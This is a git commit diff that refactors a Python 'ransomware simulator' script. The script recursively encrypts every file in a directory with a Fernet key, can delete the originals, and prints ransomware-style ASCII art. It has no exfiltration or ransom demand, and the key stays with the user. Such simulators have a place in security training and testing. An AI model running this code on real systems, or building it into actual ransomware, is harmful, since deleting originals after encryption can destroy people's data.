dd505fd1348c2dbd46d873624fd79cc21bfb8e61
Ko4la <francois@le.ko4la.fr>
2024-03-27 22:33:51 +0100

    Update encrypt_file.py

--- encrypt_file.py
+++ encrypt_file.py
@@ -15,43 +15,118 @@
 
 import os
 import argparse
+import logging
 from cryptography.fernet import Fernet
+import datetime
 
+class FileEncryptor:
+    def __init__(self, key_file, log_file=None, debug=False):
+        """Initialize the FileEncryptor with the encryption key and set up logging"""
+        self.key = self.load_key(key_file)
+        self.f = Fernet(self.key)
+        self.setup_logging(log_file, debug)
 
-def load_key(key_file):
-    """Load encryption key from a file"""
-    with open(key_file, 'rb') as file:
-        return file.read()
+    def load_key(self, key_file):
+        """Load encryption key from a file"""
+        with open(key_file, 'rb') as file:
+            return file.read()
 
-def encrypt_file(file_path, key):
-    """Encrypt a file with the given key"""
-    f = Fernet(key)
-    with open(file_path, 'rb') as file:
-        data = file.read()
-    encrypted_data = f.encrypt(data)
-    with open(file_path + '.encrypted', 'wb') as encrypted_file:
-        encrypted_file.write(encrypted_data)
+    def setup_logging(self, log_file=None, debug=False):
+        """Set up logging"""
+        self.logger = logging.getLogger(__name__)
+        self.logger.setLevel(logging.DEBUG if debug else logging.INFO)
+        formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s', datefmt='%Y-%m-%dT%H:%M:%S%z')
+        if log_file:
+            file_handler = logging.FileHandler(log_file)
+            file_handler.setFormatter(formatter)
+            self.logger.addHandler(file_handler)
+        else:
+            console_handler = logging.StreamHandler()
+            console_handler.setFormatter(formatter)
+            self.logger.addHandler(console_handler)
 
-def decrypt_file(encrypted_file_path, key):
-    """Decrypt an encrypted file with the given key"""
-    f = Fernet(key)
-    with open(encrypted_file_path, 'rb') as encrypted_file:
-        encrypted_data = encrypted_file.read()
-    decrypted_data = f.decrypt(encrypted_data)
-    with open(encrypted_file_path[:-len('.encrypted')], 'wb') as decrypted_file:
-        decrypted_file.write(decrypted_data)
+    def encrypt_file(self, file_path):
+        """Encrypt a file with the given key"""
+        if file_path.endswith('.encrypted'):
+            self.logger.error(f"File '{file_path}' is already encrypted.")
+            return
+        try:
+            with open(file_path, 'rb') as file:
+                data = file.read()
+            encrypted_data = self.f.encrypt(data)
+            with open(file_path + '.encrypted', 'wb') as encrypted_file:
+                encrypted_file.write(encrypted_data)
+            if self.logger.isEnabledFor(logging.DEBUG):
+                self.logger.debug(f"Encrypted file: {file_path}")
+        except Exception as e:
+            self.logger.error(f"Failed to encrypt file: {file_path}. Error: {str(e)}")
+            return False
+        return True
 
-def process_directory(directory, key, encrypt=True, delete_original=False):
-    """Process files in a directory recursively"""
-    for root, dirs, files in os.walk(directory):
-        for file in files:
-            file_path = os.path.join(root, file)
-            if encrypt:
-                encrypt_file(file_path, key)
-            else:
-                decrypt_file(file_path, key)
-            if delete_original:
-                os.remove(file_path)
+    def decrypt_file(self, encrypted_file_path):
+        """Decrypt an encrypted file with the given key"""
+        if not encrypted_file_path.endswith('.encrypted'):
+            self.logger.error(f"File '{encrypted_file_path}' is already decrypted.")
+            return
+        try:
+            with open(encrypted_file_path, 'rb') as encrypted_file:
+                encrypted_data = encrypted_file.read()
+            decrypted_data = self.f.decrypt(encrypted_data)
+            with open(encrypted_file_path[:-len('.encrypted')], 'wb') as decrypted_file:
+                decrypted_file.write(decrypted_data)
+            if self.logger.isEnabledFor(logging.DEBUG):
+                self.logger.debug(f"Decrypted file: {encrypted_file_path}")
+        except Exception as e:
+            self.logger.error(f"Failed to decrypt file: {encrypted_file_path}. Error: {str(e)}")
+            return False
+        return True
+
+    def ascii_art(self):
+        print("""\
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⠶⠶⠶⠶⢦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡾⠛⠁⠀⠀⠀⠀⠀⠀⠈⠙⢷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡾⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡾⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠸⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⣠⡴⠞⠛⠉⠉⣩⣍⠉⠉⠛⠳⢦⣄⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡀⠀⣴⡿⣧⣀⠀⢀⣠⡴⠋⠙⢷⣄⡀⠀⣀⣼⢿⣦⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣧⡾⠋⣷⠈⠉⠉⠉⠉⠀⠀⠀⠀⠉⠉⠋⠉⠁⣼⠙⢷⣼⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣇⠀⢻⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡟⠀⣸⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣹⣆⠀⢻⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡟⠀⣰⣏⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⠞⠋⠁⠙⢷⣄⠙⢷⣀⠀⠀⠀⠀⠀⠀⢀⡴⠋⢀⡾⠋⠈⠙⠻⢦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡾⠋⠀⠀⠀⠀⠀⠀⠹⢦⡀⠙⠳⠶⢤⡤⠶⠞⠋⢀⡴⠟⠀⠀⠀⠀⠀⠀⠙⠻⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⣼⠋⠀⠀⢀⣤⣤⣤⣤⣤⣤⣤⣿⣦⣤⣤⣤⣤⣤⣤⣴⣿⣤⣤⣤⣤⣤⣤⣤⡀⠀⠀⠙⣧⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⣸⠏⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⢠⣴⠞⠛⠛⠻⢦⡄⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠸⣇⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⢠⡟⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⣿⣿⢶⣄⣠⡶⣦⣿⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⢻⡄⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⣾⠁⠀⠀⠀⠀⠘⣇⠀⠀⠀⠀⠀⠀⠀⢻⣿⠶⠟⠻⠶⢿⡿⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠈⣿⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⢰⡏⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⢾⣄⣹⣦⣀⣀⣴⢟⣠⡶⠀⠀⠀⠀⠀⠀⣼⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠈⠛⠿⣭⣭⡿⠛⠁⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠘⣧⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⢿⡀⠀⠀⠀⠀⠀⠀⣀⡴⠞⠋⠙⠳⢦⣀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⢰⡏⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠈⢿⣄⣀⠀⠀⢀⣤⣼⣧⣤⣤⣤⣤⣤⣿⣭⣤⣤⣤⣤⣤⣤⣭⣿⣤⣤⣤⣤⣤⣼⣿⣤⣄⠀⠀⣀⣠⡾⠁⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠈⠉⠛⠛⠻⢧⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠼⠟⠛⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⣷⣶⣶⣶⣶⣶⣶⣿⣷⣶⣿⣿⣾⣿⣶⣶⣿⣿⣷⣿⣿⣿⣿⣿⣿⣾⣿⣿⣿⣿⣷⣷⣿⣷⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶
+               RANSOMWARE SIMULATOR
+⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣷⣶⣿⣿
+                      """)
+
+    def process_directory(self, directory, encrypt=True, delete_original=False):
+        """Process files in a directory recursively"""
+        for root, dirs, files in os.walk(directory):
+            for file in files:
+                file_path = os.path.join(root, file)
+                success = False
+                if encrypt:
+                    success = self.encrypt_file(file_path)
+                else:
+                    success = self.decrypt_file(file_path)
+                if delete_original and success:
+                    os.remove(file_path)
+        if encrypt:
+            self.ascii_art()
+        self.logger.info("Operation completed successfully.")
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(description="Encrypt or decrypt files in a directory recursively using a given key")
@@ -59,12 +134,9 @@ if __name__ == "__main__":
     parser.add_argument("key_file", help="Path to the file containing the encryption key")
     parser.add_argument("directory", help="Path to the directory to process")
     parser.add_argument("--delete-original", action="store_true", help="Delete original files after encryption/decryption")
+    parser.add_argument("--log-file", help="Path to the log file")
+    parser.add_argument("--debug", action="store_true", help="Enable debug mode to print detailed information")
     args = parser.parse_args()
 
-    # Load the encryption key from the specified file
-    key = load_key(args.key_file)
-
-    # Process files in the specified directory
-    process_directory(args.directory, key, encrypt=args.action == "encrypt", delete_original=args.delete_original)
-
-    print("Operation completed successfully.")
+    file_encryptor = FileEncryptor(args.key_file, args.log_file, debug=args.debug)
+    file_encryptor.process_directory(args.directory, encrypt=args.action == "encrypt", delete_original=args.delete_original)
